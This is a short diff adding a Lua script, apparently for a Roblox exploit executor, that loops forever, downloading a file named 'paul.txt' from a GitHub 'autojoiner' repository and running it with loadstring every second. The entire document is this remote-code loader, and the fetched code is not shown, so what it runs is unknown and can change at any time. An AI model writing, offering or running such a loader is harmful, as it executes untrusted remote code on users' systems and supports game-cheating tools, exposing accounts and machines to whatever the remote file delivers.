@@ -1,0 +1,4 @@
+while true do
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Voidhubteam/autojoiner/refs/heads/main/paul.txt'))()
+    wait(1)  -- Wait for 1 second before executing again
+end
